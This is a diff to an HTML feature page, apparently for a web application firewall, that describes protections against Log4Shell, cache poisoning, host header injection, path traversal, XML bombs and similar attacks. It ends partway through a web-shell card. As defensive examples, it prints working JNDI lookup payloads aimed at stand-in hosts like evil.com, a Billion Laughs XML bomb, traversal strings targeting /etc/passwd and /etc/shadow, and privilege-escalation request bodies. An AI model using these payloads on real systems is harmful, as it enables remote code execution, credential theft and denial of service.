@@ -3143,66 +3143,6 @@
           </template>
 
           <!-- ============================================= -->
-          <!-- 17. Cache Poisoning Protection -->
-          <!-- ============================================= -->
-          <div class="feature-card" data-id="cache_poisoning">
-              <h3>💾 Cache Poisoning Protection</h3>
-              <p>Prevents attackers from injecting malicious content into CDN and application caches</p>
-          </div>
-
-          <template id="cache_poisoning">
-              <p>Blocks cache poisoning attacks that inject malicious responses into shared caches.</p>
-
-              <h4>🎯 Attack Vectors Blocked</h4>
-              <ul>
-                  <li>X-Forwarded-Host Poisoning</li>
-                  <li>Cache Key Manipulation</li>
-                  <li>Unkeyed Header Injection</li>
-                  <li>Vary Header Abuse</li>
-                  <li>Cache Deception</li>
-                  <li>Request Smuggling for Caches</li>
-              </ul>
-
-              <h4>🛡️ Protection Features</h4>
-              <ul>
-                  <li>Normalize cache keys</li>
-                  <li>Remove redundant headers</li>
-                  <li>Validate X-Forwarded headers</li>
-                  <li>Rate limit purges</li>
-                  <li>Cache response validation</li>
-              </ul>
-          </template>
-
-          <!-- ============================================= -->
-          <!-- 18. HTTP Verb Tampering Protection -->
-          <!-- ============================================= -->
-          <div class="feature-card" data-id="verb_tampering">
-              <h3>🔨 HTTP Verb Tampering Protection</h3>
-              <p>Blocks dangerous HTTP methods and tampering attempts</p>
-          </div>
-
-          <template id="verb_tampering">
-              <p>Blocks dangerous and unauthorized HTTP methods that could compromise security.</p>
-
-              <h4>🚫 Blocked Methods</h4>
-              <ul>
-                  <li><code>TRACE</code> (XST attacks)</li>
-                  <li><code>CONNECT</code> (proxy abuse)</li>
-                  <li><code>HEAD</code> (information disclosure)</li>
-                  <li><code>OPTIONS</code> (method enumeration)</li>
-                  <li><code>PATCH</code> (unauthorized modifications)</li>
-              </ul>
-
-              <h4>🛡️ Protection Actions</h4>
-              <ul>
-                  <li>Block TRACE, CONNECT methods</li>
-                  <li>Log OPTIONS requests</li>
-                  <li>Validate allowed methods per endpoint</li>
-                  <li>Custom method whitelisting</li>
-              </ul>
-          </template>
-
-          <!-- ============================================= -->
           <!-- 19. API Schema Validation -->
           <!-- ============================================= -->
           <div class="feature-card" data-id="api_schema">
@@ -3252,6 +3192,637 @@
                   <li>Reject multiple Host headers</li>
                   <li>Normalize port stripping</li>
               </ul>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 1. Subdomain Takeover Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="subdomain_takeover">
+              <h3>🏢 Subdomain Takeover Protection</h3>
+              <p>Detects and prevents dangling DNS records pointing to unclaimed cloud services</p>
+          </div>
+
+          <template id="subdomain_takeover">
+              <p>Prevents attackers from claiming abandoned subdomains pointing to external cloud services (S3 buckets, GitHub Pages, Heroku, Azure, etc.) for phishing, XSS, or session hijacking.</p>
+
+              <h4>🎯 Monitored Cloud Services</h4>
+              <ul>
+                  <li>AWS S3 Buckets (dangling bucket takeover)</li>
+                  <li>GitHub Pages (unclaimed repository)</li>
+                  <li>Heroku Apps (deleted/unclaimed apps)</li>
+                  <li>Azure CDN / Storage</li>
+                  <li>Google Cloud Storage</li>
+                  <li>DigitalOcean Spaces</li>
+                  <li>Shopify (unclaimed stores)</li>
+                  <li>WordPress.com (unclaimed blogs)</li>
+                  <li>Zendesk (unclaimed helpdesk)</li>
+                  <li>Campaign Monitor (unclaimed accounts)</li>
+                  <li>Freshdesk (unclaimed support)</li>
+                  <li>SendGrid (unclaimed email services)</li>
+              </ul>
+
+              <h4>🛡️ Protection Mechanisms</h4>
+              <ul>
+                  <li>CNAME Record Monitoring & Alerting</li>
+                  <li>Dead DNS Entry Detection</li>
+                  <li>Automatic Subdomain Health Checks</li>
+                  <li>Orphaned Resource Detection</li>
+                  <li>DNS Response Validation</li>
+                  <li>Cloud Service Takeover Detection</li>
+                  <li>Subdomain Fingerprint Tracking</li>
+                  <li>Periodic DNS Audit</li>
+              </ul>
+
+              <h4>📋 Detected Vulnerable Patterns</h4>
+              <ul>
+                  <li>CNAME to expired S3 bucket → <code>s3-website-us-east-1.amazonaws.com</code> not resolving</li>
+                  <li>CNAME to unclaimed Heroku → <code>yourapp.herokuapp.com</code> shows "No such app"</li>
+                  <li>CNAME to GitHub Pages with no repository</li>
+                  <li>MX records pointing to dead email services</li>
+                  <li>NS records pointing to unclaimed subdomains</li>
+                  <li>TXT records with dangling verification tokens</li>
+              </ul>
+
+              <h4>⚙️ Security Actions</h4>
+              <ul>
+                  <li>Alert on suspicious CNAME resolution failures</li>
+                  <li>Block requests to dangling subdomains</li>
+                  <li>Automatic SSL Certificate validation</li>
+                  <li>DNS Record Expiry Monitoring</li>
+                  <li>Takeover Attempt Logging</li>
+                  <li>Instant Email/Slack/FCM Notification</li>
+                  <li>Automated DNS Cleanup Recommendations</li>
+              </ul>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 2. Log4Shell Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="log4shell">
+              <h3>📝 Log4Shell (CVE-2021-44228) Protection</h3>
+              <p>Blocks JNDI injection attacks targeting Log4j vulnerabilities</p>
+          </div>
+
+          <template id="log4shell">
+              <p>Blocks all variants of the Log4Shell exploit (CVE-2021-44228) that allow Remote Code Execution via JNDI injection in log messages.</p>
+
+              <h4>🎯 Attack Patterns Blocked</h4>
+              <ul>
+                  <li>Basic JNDI: <code>${jndi:ldap://evil.com/exploit}</code></li>
+                  <li>Lowercase Bypass: <code>${jndi:${lower:l}${lower:d}ap://evil.com}</code></li>
+                  <li>Upper/Lower Mix: <code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}</code></li>
+                  <li>Environment Variables: <code>${${env:JNDI:-j}ndi:ldap://evil.com}</code></li>
+                  <li>Nested Variables: <code>${${web:jndi}${web:ldap:}evil.com}</code></li>
+                  <li>Base64 Encoded: <code>${${base64:am5kaQ==}:ldap://evil.com}</code></li>
+                  <li>DNS Lookup: <code>${jndi:dns://evil.com}</code></li>
+                  <li>RMI Protocol: <code>${jndi:rmi://evil.com/exploit}</code></li>
+                  <li>IIOP Protocol: <code>${jndiiop://evil.com}</code></li>
+                  <li>LDAPS Protocol: <code>${jndi:ldaps://evil.com}</code></li>
+                  <li>CORBA Protocol: <code>${jndi:corbaname:evil.com}</code></li>
+                  <li>Remote/Local Mix: <code>${${ctx:jndi}${ctx:ldap}://evil.com}</code></li>
+              </ul>
+
+              <h4>🔍 Detection Techniques</h4>
+              <ul>
+                  <li>Regex-based JNDI Pattern Matching</li>
+                  <li>Multi-layer Nested Expression Decoding</li>
+                  <li>Environment Variable Interpolation Detection</li>
+                  <li>Lowercase/Environment/Base64 Bypass Detection</li>
+                  <li>All HTTP Headers Scanning (User-Agent, Referer, X-Forwarded-For, Cookie, Authorization, etc.)</li>
+                  <li>Query String Parameter Inspection</li>
+                  <li>POST Body (JSON, XML, Form) Scanning</li>
+                  <li>Path Parameter Validation</li>
+                  <li>WebSocket Message Inspection</li>
+              </ul>
+
+              <h4>🛡️ Protected Vectors</h4>
+              <ul>
+                  <li><strong>HTTP Headers:</strong> User-Agent, Referer, X-Forwarded-For, X-Real-IP, Cookie, Authorization, Origin</li>
+                  <li><strong>Query Parameters:</strong> All URL parameters</li>
+                  <li><strong>Request Body:</strong> JSON, XML, Form data, Multipart uploads</li>
+                  <li><strong>URL Path:</strong> Path segments, file extensions</li>
+                  <li><strong>Uploaded Files:</strong> Filename, content inspection</li>
+                  <li><strong>WebSocket:</strong> Message frames</li>
+              </ul>
+
+              <h4>⚙️ Security Actions</h4>
+              <ul>
+                  <li>Immediate request blocking on JNDI pattern match</li>
+                  <li>IP-based blocking with nftables/firewall</li>
+                  <li>Fingerprint-based rate limiting</li>
+                  <li>Automatic attack logging to ClickHouse</li>
+                  <li>Real-time alerts (Slack, Email, FCM, WebSocket)</li>
+                  <li>Suspicious pattern scoring system</li>
+                  <li>WAF bypass attempt detection</li>
+              </ul>
+
+              <h4>📊 Example Blocked Payloads</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          ${jndi:ldap://attacker.com/Exploit}
+          ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com}
+          ${${env:JNDI:-j}ndi${env:JNDI:-:}${env:JNDI:-l}dap://malicious.com}
+          ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://hack.com}
+          ${jndi:${lower:l}${upper:d}a${::-p}://exploit.com/payload}</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 3. HTTP Verb Tampering Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="http_verb_tampering">
+              <h3>🔧 HTTP Verb Tampering Protection</h3>
+              <p>Blocks arbitrary and overridden HTTP methods bypassing ACL restrictions</p>
+          </div>
+
+          <template id="http_verb_tampering">
+              <p>Prevents attackers from using HTTP method override headers to bypass authentication, authorization, and security controls.</p>
+
+              <h4>🎯 Attack Patterns Blocked</h4>
+              <ul>
+                  <li><code>X-HTTP-Method-Override</code> header injection</li>
+                  <li><code>X-HTTP-Method</code> override attacks</li>
+                  <li><code>X-Method-Override</code> header abuse</li>
+                  <li><code>X-Original-Method</code> spoofing</li>
+                  <li><code>_method</code> query parameter override</li>
+                  <li><code>method</code> parameter in POST body</li>
+                  <li>HTTP/2 pseudo-header manipulation</li>
+                  <li>Custom method injection</li>
+              </ul>
+
+              <h4>🎯 Bypass Scenarios Blocked</h4>
+              <ul>
+                  <li><strong>GET to POST:</strong> Circumventing CSRF tokens</li>
+                  <li><strong>GET to DELETE:</strong> Unauthorized data deletion</li>
+                  <li><strong>GET to PUT/PATCH:</strong> Data modification without permission</li>
+                  <li><strong>POST to DELETE:</strong> Privilege escalation via method change</li>
+                  <li><strong>HEAD to POST:</strong> Web cache deception attacks</li>
+                  <li><strong>Invalid HTTP methods:</strong> ACK, BUG, FIND, etc.</li>
+                  <li><strong>Verb-based access control bypass:</strong> When only GET is allowed but POST is overridden</li>
+              </ul>
+
+              <h4>🛡️ Protection Mechanisms</h4>
+              <ul>
+                  <li>HTTP Method Whitelist Enforcement (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS)</li>
+                  <li>Override Header Detection & Blocking</li>
+                  <li>Method Normalization</li>
+                  <li>Consistent Method Validation Across All Endpoints</li>
+                  <li>Per-Endpoint Method Restriction</li>
+                  <li>Invalid Method Rejection (405)</li>
+                  <li>Method Spoofing Alerting</li>
+                  <li>Security Header Enforcement (<code>X-HTTP-Method-Override: block</code>)</li>
+              </ul>
+
+              <h4>⚙️ Configuration Options</h4>
+              <ul>
+                  <li>Allowed Methods per Path (e.g., /api/ POST, PUT, DELETE allowed)</li>
+                  <li>Override Header Block Policy (block or strip)</li>
+                  <li>Method Validation Strictness Level</li>
+                  <li>Custom Method Allowlist</li>
+                  <li>Admin-Only Method Restriction</li>
+              </ul>
+
+              <h4>📋 Example Blocked Requests</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          GET /admin/users/123 HTTP/1.1
+          X-HTTP-Method-Override: DELETE
+
+          POST /api/payment HTTP/1.1
+          X-Method-Override: GET
+
+          GET /profile/edit?_method=PUT HTTP/1.1</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 4. Mass Assignment Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="mass_assignment">
+              <h3>🎯 Mass Assignment Protection</h3>
+              <p>Blocks privilege escalation attempts via hidden JSON body parameters</p>
+          </div>
+
+          <template id="mass_assignment">
+              <p>Prevents attackers from modifying protected model attributes by injecting extra fields in JSON/Form requests (Mass Assignment/RBAC bypass vulnerabilities).</p>
+
+              <h4>🎯 Protected Sensitive Fields</h4>
+              <ul>
+                  <li><strong>Role/Privilege Fields:</strong> <code>role</code>, <code>roles</code>, <code>is_admin</code>, <code>isAdmin</code>, <code>admin</code>, <code>privilege</code>, <code>permissions</code></li>
+                  <li><strong>Account Control:</strong> <code>is_active</code>, <code>is_verified</code>, <code>status</code>, <code>account_status</code>, <code>locked</code></li>
+                  <li><strong>Database Fields:</strong> <code>_id</code>, <code>__v</code>, <code>createdAt</code>, <code>updatedAt</code>, <code>version</code></li>
+                  <li><strong>Financial Fields:</strong> <code>balance</code>, <code>credits</code>, <code>subscription_tier</code>, <code>plan</code></li>
+                  <li><strong>Password Fields:</strong> <code>password</code>, <code>password_confirmation</code>, <code>current_password</code></li>
+                  <li><strong>Auth Fields:</strong> <code>api_key</code>, <code>access_token</code>, <code>refresh_token</code>, <code>session_id</code></li>
+                  <li><strong>MongoDB Prototype Pollution:</strong> <code>__proto__</code>, <code>constructor</code>, <code>prototype</code></li>
+                  <li><strong>Nested Object Injection:</strong> <code>user[role]</code>, <code>data.isAdmin</code>, <code>profile.privileges</code></li>
+              </ul>
+
+              <h4>🛡️ Detection Techniques</h4>
+              <ul>
+                  <li>Deep JSON Body Scanning (recursive object traversal)</li>
+                  <li>Form Parameter Inspection (multipart, URL-encoded)</li>
+                  <li>Query String Parameter Analysis</li>
+                  <li>Field Name Blacklist with Pattern Matching</li>
+                  <li>Whitelist-based Field Allowlisting</li>
+                  <li>Model Schema Validation</li>
+                  <li>Underscore/CamelCase Normalization</li>
+                  <li>Nested Object Detection</li>
+                  <li>Wildcard Parameter Rejection (<code>*</code>, <code>**</code>, <code>[*]</code>)</li>
+              </ul>
+
+              <h4>⚙️ Protection Modes</h4>
+              <ul>
+                  <li><strong>BLOCK:</strong> Reject requests containing protected fields</li>
+                  <li><strong>STRIP:</strong> Remove protected fields before processing</li>
+                  <li><strong>ALERT:</strong> Log only, allow request (monitoring mode)</li>
+                  <li><strong>AUTO:</strong> Block if score exceeds threshold</li>
+              </ul>
+
+              <h4>📋 Example Blocked Requests</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          POST /api/users/register HTTP/1.1
+          Content-Type: application/json
+
+          {"username": "attacker", "email": "x@x.com", "is_admin": true}
+
+          PUT /api/profile/123 HTTP/1.1
+          Content-Type: application/x-www-form-urlencoded
+
+          username=hacker&role=administrator&balance=999999
+
+          POST /api/update-user HTTP/1.1
+
+          user[name]=attack&user[privilege_level]=99&user[__v]=0</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 5. Cache Poisoning Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="cache_poisoning">
+              <h3>💾 Cache Poisoning Protection</h3>
+              <p>Prevents CDN, proxy, and application cache poisoning via header abuse</p>
+          </div>
+
+          <template id="cache_poisoning">
+              <p>Blocks attackers from injecting malicious content into shared caches (CDN, reverse proxy, load balancer) using unkeyed header injection.</p>
+
+              <h4>🎯 Attack Vectors Blocked</h4>
+              <ul>
+                  <li><strong>X-Forwarded-Host:</strong> Cache key poisoning via host header</li>
+                  <li><strong>X-Original-URL:</strong> Cache deception via URL rewriting</li>
+                  <li><strong>X-Rewrite-URL:</strong> Path-based cache poisoning</li>
+                  <li><strong>X-Forwarded-Path:</strong> Alternative path injection</li>
+                  <li><strong>X-Forwarded-Port:</strong> Port-based cache variation</li>
+                  <li><strong>X-Forwarded-Proto:</strong> HTTP/HTTPS cache confusion</li>
+                  <li><strong>X-Forwarded-Scheme:</strong> Protocol mismatch attacks</li>
+                  <li><strong>X-Original-Host:</strong> Alternate host injection</li>
+                  <li><strong>X-Forwarded-For:</strong> Cache key manipulation via IP</li>
+                  <li><strong>X-Real-IP:</strong> Client IP cache poisoning</li>
+                  <li><strong>X-Custom-Header:</strong> Unkeyed header injection</li>
+                  <li><strong>Vary Header Abuse:</strong> Cache DoS via varying headers</li>
+              </ul>
+
+              <h4>🛡️ Protection Mechanisms</h4>
+              <ul>
+                  <li>Header Normalization & Validation</li>
+                  <li>Cache Key Normalization (remove unkeyed headers)</li>
+                  <li>Dangerous Header Stripping</li>
+                  <li>X-Forwarded Header Sanitization</li>
+                  <li>Cache Response Validation</li>
+                  <li>Duplicate Header Detection & Blocking</li>
+                  <li>Header Length Limiting</li>
+                  <li>Cache Purge Request Validation</li>
+                  <li>Cache-Key Whitelisting</li>
+                  <li>Response Variant Analysis</li>
+              </ul>
+
+              <h4>⚙️ Protected Headers Automatically Stripped</h4>
+              <ul>
+                  <li><code>X-Forwarded-Host</code>, <code>X-Forwarded-Path</code>, <code>X-Forwarded-Port</code></li>
+                  <li><code>X-Original-URL</code>, <code>X-Rewrite-URL</code>, <code>X-Original-Host</code></li>
+                  <li><code>X-Forwarded-Server</code>, <code>X-Proxy-Host</code>, <code>X-Real-IP</code></li>
+                  <li><code>X-Forwarded-For</code> (only first IP preserved for logs)</li>
+                  <li>Custom unkeyed headers configurable</li>
+              </ul>
+
+              <h4>📋 Example Attack Blocked</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          GET / HTTP/1.1
+          Host: vulnerable.com
+          X-Forwarded-Host: evil.com
+
+          GET /admin/users HTTP/1.1
+          X-Original-URL: /index.html
+          X-Rewrite-URL: /cache-buster
+
+          GET /products/123 HTTP/1.1
+          X-Forwarded-Path: /malicious
+          Cache-Control: public, max-age=3600</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 6. Host Header Injection Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="host_header_injection">
+              <h3>🏠 Host Header Injection Protection</h3>
+              <p>Prevents password reset poisoning, cache poisoning, and virtual host bypass attacks</p>
+          </div>
+
+          <template id="host_header_injection">
+              <p>Blocks attackers from manipulating the Host header to poison password reset links, bypass virtual host routing, and launch web cache deception attacks.</p>
+
+              <h4>🎯 Attack Vectors Blocked</h4>
+              <ul>
+                  <li><strong>Password Reset Poisoning:</strong> Host header modified to point to attacker domain</li>
+                  <li><strong>Cache Poisoning:</strong> Malicious host header cached by CDN/proxy</li>
+                  <li><strong>Virtual Host Bypass:</strong> Access restricted vhosts via host header</li>
+                  <li><strong>Web Cache Deception:</strong> Host variation causing cache mismatch</li>
+                  <li><strong>XSS via Host Reflection:</strong> Malicious script in host header</li>
+                  <li><strong>DNS Rebinding:</strong> Host header pointing to internal IPs</li>
+                  <li><strong>Port Injection:</strong> <code>example.com:8080</code> bypassing port restrictions</li>
+                  <li><strong>Localhost Attack:</strong> <code>127.0.0.1</code>, <code>localhost</code> host values</li>
+                  <li><strong>Line-Feed Injection:</strong> <code>%0d%0a</code> HTTP response splitting</li>
+                  <li><strong>Duplicate Host Header:</strong> Multiple Host headers causing ambiguity</li>
+              </ul>
+
+              <h4>🛡️ Protection Mechanisms</h4>
+              <ul>
+                  <li>Host Whitelist Validation (against configured domains)</li>
+                  <li>Port Stripping & Validation</li>
+                  <li>localhost/Private IP Blocking (127.0.0.1, 0.0.0.0, ::1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)</li>
+                  <li>Duplicate Host Header Rejection</li>
+                  <li>CRLF Injection Prevention (<code>\r\n</code>, <code>%0d%0a</code>, <code>%0a%0d</code>)</li>
+                  <li>Null Byte Detection (<code>%00</code>, <code>\x00</code>)</li>
+                  <li>Path Traversal Detection (<code>../</code>, <code>..%2f</code>)</li>
+                  <li>Host Length Validation (max 255 chars)</li>
+                  <li>Allowed Character Whitelist (a-z, 0-9, ., -, :) </li>
+                  <li>Automated Host Normalization</li>
+              </ul>
+
+              <h4>⚙️ Configuration Options</h4>
+              <ul>
+                  <li>Allowed Domains List (primary + aliases)</li>
+                  <li>Block Private IPs (toggle)</li>
+                  <li>Block Localhost (toggle)</li>
+                  <li>Strip Port from Host (toggle)</li>
+                  <li>Case-Sensitive Validation (off by default)</li>
+              </ul>
+
+              <h4>📋 Example Blocked Requests</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          POST /reset-password HTTP/1.1
+          Host: evil.com
+          Content-Type: application/json
+
+          {"email": "victim@example.com"}
+
+          GET /admin HTTP/1.1
+          Host: 127.0.0.1
+
+          GET /%0d%0aX-Forwarded-Host:evil.com HTTP/1.1
+          Host: vulnerable.com
+
+          Host: vulnerable.com
+          Host: evil.com
+          Host: vulnerable.com</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 7. ReDoS Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="redos">
+              <h3>⏱️ Regular Expression Denial of Service (ReDoS) Protection</h3>
+              <p>Blocks catastrophic regex input patterns targeting vulnerable regex implementations</p>
+          </div>
+
+          <template id="redos">
+              <p>Prevents ReDoS attacks that exploit inefficient regular expressions with catastrophic backtracking to freeze or crash the server.</p>
+
+              <h4>🎯 Attack Patterns Detected</h4>
+              <ul>
+                  <li><strong>Nested Quantifiers:</strong> <code>(a+)+</code>, <code>(a*)*</code>, <code>(a?)?</code></li>
+                  <li><strong>Overlapping Alternations:</strong> <code>(a|a)+</code>, <code>(a|aa)+</code></li>
+                  <li><strong>Long Repetitions:</strong> <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code> with nested patterns</li>
+                  <li><strong>Repeated Groups:</strong> <code>(a+)*$</code>, <code>(.*)*</code></li>
+                  <li><strong>Evil Regex Patterns:</strong> <code>^(([a-z])+.)+[A-Z]([a-z])+$</code></li>
+                  <li><strong>Polynomial Time Patterns:</strong> <code>(a|aa)+b</code>, <code>(a|a)+b</code></li>
+                  <li><strong>Exponential Time Patterns:</strong> <code>(a+)+$</code>, <code>([a-zA-Z]+)*$</code></li>
+                  <li><strong>Long Strings with Repetition:</strong> <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></li>
+                  <li><strong>Known ReDoS Payloads:</strong> From OWASP ReDoS list</li>
+                  <li><strong>Low Character Variety + High Length:</strong> High entropy + repeating patterns</li>
+              </ul>
+
+              <h4>🛡️ Detection Techniques</h4>
+              <ul>
+                  <li>Input Length Validation (max 10,000 chars default)</li>
+                  <li>Character Variety Analysis (low variety = suspicious)</li>
+                  <li>Repetition Pattern Detection (run-length encoding)</li>
+                  <li>Nested Pattern Matching (regex token parsing)</li>
+                  <li>Execution Timeouts (prevent DoS at runtime)</li>
+                  <li>Memory Usage Monitoring (abort excessive allocations)</li>
+                  <li>Known ReDoS Payload Database</li>
+                  <li>Adaptive Rate Limiting (throttle on detection)</li>
+                  <li>Automated Regex Static Analysis (pre-filter dangerous patterns)</li>
+              </ul>
+
+              <h4>⚙️ Protection Thresholds</h4>
+              <ul>
+                  <li>Max Input Length: 10,000 characters (configurable)</li>
+                  <li>Max Repetition Count: 50 consecutive same chars</li>
+                  <li>Low Variety Threshold: &lt; 5 unique chars in input</li>
+                  <li>Execution Timeout: 100ms per regex operation</li>
+                  <li>Block Threshold: Attack score ≥ 8/10</li>
+              </ul>
+
+              <h4>📋 Example Blocked Payloads</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+          aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+          (a+)+b pattern: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+          (a*)* pattern: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+          (a|a)+ pattern: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+          ([a-zA-Z]+)*$ pattern: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 8. XML Bomb Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="xml_bomb">
+              <h3>💣 XML Bomb (Billion Laughs) Protection</h3>
+              <p>Prevents quadratic blowup and entity expansion attacks in XML documents</p>
+          </div>
+
+          <template id="xml_bomb">
+              <p>Blocks XML denial-of-service attacks using entity expansion, nested entities, and external entity references (Billion Laughs, Quadratic Blowup).</p>
+
+              <h4>🎯 Attack Types Blocked</h4>
+              <ul>
+                  <li><strong>Billion Laughs Attack:</strong> Recursive entity expansion</li>
+                  <li><strong>Quadratic Blowup:</strong> Large entity references causing memory exhaustion</li>
+                  <li><strong>External Entity Expansion (XXE):</strong> File inclusion with expansion</li>
+                  <li><strong>Deep Nesting:</strong> Highly nested XML elements</li>
+                  <li><strong>Attribute Bomb:</strong> Excessive attributes per element</li>
+                  <li><strong>Large CDATA Sections:</strong> Oversized character data</li>
+                  <li><strong>XML Declaration Bomb:</strong> Large encoding declarations</li>
+                  <li><strong>Namespace Bomb:</strong> Excessive XML namespaces</li>
+              </ul>
+
+              <h4>🛡️ Protection Mechanisms</h4>
+              <ul>
+                  <li>Disable External Entity Resolution</li>
+                  <li>Disable DTD Processing (security-focused parsing)</li>
+                  <li>Entity Expansion Limit (max 10,000 expansions)</li>
+                  <li>Nested Entity Limit (max depth 10)</li>
+                  <li>Max Element Depth (max 100 levels)</li>
+                  <li>Max Attributes per Element (max 50)</li>
+                  <li>Max Content Length (configurable)</li>
+                  <li>Max CDATA Section Size (1MB default)</li>
+                  <li>Max Entity Parameter Count (max 100)</li>
+                  <li>Strict XML Parsing Mode</li>
+                  <li>Memory Usage Limits</li>
+                  <li>Processing Timeout (5 seconds max)</li>
+              </ul>
+
+              <h4>⚙️ Safe XML Parsing Configuration</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          decoder := xml.NewDecoder(bytes.NewReader(body))
+          decoder.Strict = true
+          decoder.Entity = map[string]string{} // Empty = no entities
+          decoder.CharsetReader = nil // Prevent charset attacks</pre>
+
+              <h4>📋 Example Attack Payloads</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          &lt;?xml version="1.0"?&gt;
+          &lt;!DOCTYPE lolz [
+            &lt;!ENTITY lol "lol"&gt;
+            &lt;!ENTITY lol1 "&amp;lol;&amp;lol;"&gt;
+            &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;"&gt;
+            ...
+            &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;"&gt;
+          ]&gt;
+          &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 9. Path Normalization Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="path_normalization">
+              <h3>🔄 Path Normalization Protection</h3>
+              <p>Blocks path traversal bypasses using URL encoding, Unicode, and double encoding tricks</p>
+          </div>
+
+          <template id="path_normalization">
+              <p>Prevents attackers from bypassing path-based access controls using URL encoding, Unicode normalization, null bytes, and double encoding tricks.</p>
+
+              <h4>🎯 Attack Patterns Blocked</h4>
+              <ul>
+                  <li><strong>Basic Path Traversal:</strong> <code>../</code>, <code>..\\</code>, <code>.../</code></li>
+                  <li><strong>URL Encoded:</strong> <code>%2e%2e%2f</code>, <code>%2e%2e/</code></li>
+                  <li><strong>Double Encoding:</strong> <code>%252e%252e%252f</code>, <code>%252e%252e/</code></li>
+                  <li><strong>Unicode Normalization:</strong> <code>%c0%ae%c0%ae%c0%af</code> (overlong UTF-8)</li>
+                  <li><strong>Null Byte Injection:</strong> <code>file.php%00.jpg</code>, <code>..%00/</code></li>
+                  <li><strong>Mixed Slashes:</strong> <code>..\\../</code>, <code>..//../</code></li>
+                  <li><strong>Directory Self-Reference:</strong> <code>/./././etc/passwd</code></li>
+                  <li><strong>Parent Directory Repetition:</strong> <code>....//....//....//etc/passwd</code></li>
+                  <li><strong>Hex Encoding:</strong> <code>%2E%2E%2F</code> (uppercase/lowercase mix)</li>
+                  <li><strong>Backslash Variants:</strong> <code>..%5c</code> (Windows path separator)</li>
+                  <li><strong>UTF-16 Encoding:</strong> <code>%ff%fe%2e%00%2e%00%2f%00</code></li>
+                  <li><strong>Path Prefix Bypass:</strong> <code>/var/www/../../../etc/passwd</code></li>
+              </ul>
+
+              <h4>🛡️ Protection Mechanisms</h4>
+              <ul>
+                  <li>Multi-layer URL Decoding (3-pass decode)</li>
+                  <li>Unicode Normalization (NFC/NFKD)</li>
+                  <li>Path Canonicalization (<code>path.Clean()</code>)</li>
+                  <li>Null Byte Stripping</li>
+                  <li>Character Whitelist Validation</li>
+                  <li>Base Path Enforcement (chroot-style)</li>
+                  <li>Forbidden Pattern Detection</li>
+                  <li>Sensitive Path Blacklisting (<code>/etc/passwd</code>, <code>/proc/</code>, <code>/root/</code>)</li>
+                  <li>Backslash to Forward Slash Conversion</li>
+                  <li>Double Path Clean Validation</li>
+              </ul>
+
+              <h4>📋 Example Blocked Paths</h4>
+              <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">
+          ../../../etc/passwd
+          ..%252f..%252f..%252fetc/passwd
+          ....//....//....//etc/passwd
+          /%2e%2e/%2e%2e/%2e%2e/etc/passwd
+          /var/www/../../../../etc/shadow
+          /..%c0%af..%c0%af..%c0%afetc/passwd</pre>
+          </template>
+
+          <!-- ============================================= -->
+          <!-- 10. Web Shell Upload Protection -->
+          <!-- ============================================= -->
+          <div class="feature-card" data-id="webshell_upload">
+              <h3>🐚 Web Shell Upload Protection</h3>
+              <p>Detects and blocks web shell uploads including c99, r57, b374k, and China Chopper signatures</p>
+          </div>
+
+          <template id="webshell_upload">
